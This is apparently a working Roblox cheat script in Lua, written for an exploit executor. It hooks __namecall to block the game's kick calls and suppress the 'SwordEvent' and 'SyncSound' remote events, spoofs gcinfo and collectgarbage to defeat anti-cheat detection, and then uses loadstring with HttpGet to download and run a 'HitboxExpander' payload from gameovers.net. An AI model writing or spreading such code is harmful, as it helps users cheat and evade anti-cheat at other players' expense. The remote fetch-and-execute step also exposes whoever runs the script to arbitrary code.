local plr = game:GetService("Players").LocalPlayer

local cclosure = syn_newcclosure or newcclosure or nil

if not cclosure or not hookmetamethod then
    plr:Kick("\n\nTest kyno)\n")
end

local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", cclosure(function(self,...)
    local NamecallMethod = getnamecallmethod()
    local args = {...}
    
    if NamecallMethod:lower() == "kick" and not checkcaller() then
        if self ~= plr then
            return oldNamecall(self,...)
        end
        return
    end
    
    return oldNamecall(self,...)
end))

local eventbypass

eventbypass = hookmetamethod(game, "__namecall", function(self, ...)
    local method = getnamecallmethod()
    local args = {...}

    if not checkcaller() and self.Name == "SwordEvent" and method == "FireServer" then
        return; 
    end

    return eventbypass(self, ...)
end)

local eventbypass

eventbypass = hookmetamethod(game, "__namecall", function(self, ...)
    local method = getnamecallmethod()
    local args = {...}

    if not checkcaller() and self.Name == "SyncSound" and method == "FireServer" then
        return; 
    end

    return eventbypass(self, ...)
end)

-- local bypass

local undetected_mode = false
hookfunction(gcinfo,(function()
    if(undetected_mode==true)then
        return 1000
    else
        return wait(9e9)
    end
end))
hookfunction(collectgarbage,gcinfo)

loadstring(game:HttpGet("http://gameovers.net/Scripts/Free/HitboxExpander/main.lua", true))()
